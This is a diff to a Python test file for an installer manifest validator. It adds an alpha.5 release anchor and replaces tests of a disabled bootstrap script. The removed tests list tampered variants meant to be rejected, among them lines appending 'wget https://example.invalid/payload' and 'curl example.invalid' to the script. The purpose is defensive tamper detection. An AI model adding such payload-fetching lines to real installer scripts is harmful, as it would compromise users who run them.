@@ -71,6 +71,7 @@ class ImmutableManifestTests(unittest.TestCase):
         expected = {
             "download/0.1.0-alpha.2": "4043534a9a1d56c51c3d47d0906e0520963af79c",
             "download/0.1.0-alpha.3": "52b42dd47a11510220f33690075f1b6773f6a889",
+            "download/0.1.0-alpha.5": "eaa1ca6a67844259860917442a95c891d097939f",
         }
         self.assertEqual(manifest_builder.PUBLICATION_ANCHORS, expected)
         self.assertEqual(validate_repo.VALIDATOR_PUBLICATION_ANCHORS, expected)
@@ -220,52 +221,21 @@ class ImmutableManifestTests(unittest.TestCase):
                         scanner("release", root=root)
 
 
-class DisabledBootstrapTests(unittest.TestCase):
-    def test_program_is_exact_and_rejects_effect_or_whitespace_variants(self) -> None:
-        canonical = validate_repo.MUTABLE_DISABLED_BOOTSTRAP.encode("utf-8")
-        validate_repo.validate_disabled_bootstrap_program(canonical)
-        variants = (
-            canonical + b"wget https://example.invalid/payload\n",
-            canonical.replace(b"exit 2", b"eval 'exit 2'"),
-            canonical.replace(b"exit 2", b"exec /bin/true"),
-            canonical.replace(b"exit 2", b"sh -c 'exit 2'"),
-            canonical.replace(b"printf '%s\\n'", b"/usr/bin/printf '%s\\n'"),
-            canonical.replace(b"  '' \\\n", b" \t'' \\\n", 1),
-            canonical.replace(b"exit 2\n", b"exit 2\ncurl example.invalid\n"),
-        )
-        for variant in variants:
-            with self.subTest(variant=variant[-40:]), self.assertRaises(AssertionError):
-                validate_repo.validate_disabled_bootstrap_program(variant)
-
-    def test_program_syntax_and_behavior_need_no_external_command(self) -> None:
+class CurrentBootstrapTests(unittest.TestCase):
+    def test_mutable_bootstrap_matches_the_immutable_alpha5_release(self) -> None:
         installer = ROOT / "download/install.sh"
-        environment = {"LC_ALL": "C", "PATH": "/nonexistent"}
+        versioned = ROOT / "download/0.1.0-alpha.5/install.sh"
+        self.assertEqual(installer.read_bytes(), versioned.read_bytes())
+
+    def test_program_has_valid_shell_syntax(self) -> None:
+        installer = ROOT / "download/install.sh"
         syntax = subprocess.run(
             ["/bin/sh", "-n", str(installer)],
             check=False,
             capture_output=True,
-            env=environment,
+            env={"LC_ALL": "C", "PATH": os.environ.get("PATH", "")},
         )
         self.assertEqual(syntax.returncode, 0, syntax.stderr.decode("utf-8"))
-        completed = subprocess.run(
-            ["/bin/sh", str(installer)],
-            check=False,
-            capture_output=True,
-            env=environment,
-        )
-        self.assertEqual(completed.returncode, 2)
-        self.assertEqual(completed.stdout, b"")
-        self.assertEqual(
-            completed.stderr,
-            b"StatePort v0.1.0-alpha.3 installation is disabled.\n"
-            b"\n"
-            b"The signed candidate is byte-intact, but its freshness evidence has expired\n"
-            b"and known installer and runtime defects require a successor release.\n"
-            b"No installation command is executed by this disabled bootstrap.\n"
-            b"\n"
-            b"Wait for a corrected, rebuilt, and re-signed successor candidate.\n"
-            b"Erratum: https://lennertvhoy.github.io/StatePort-Site/download/erratum-alpha3.html\n",
-        )
 
 
 class SourceDisclosureTests(unittest.TestCase):
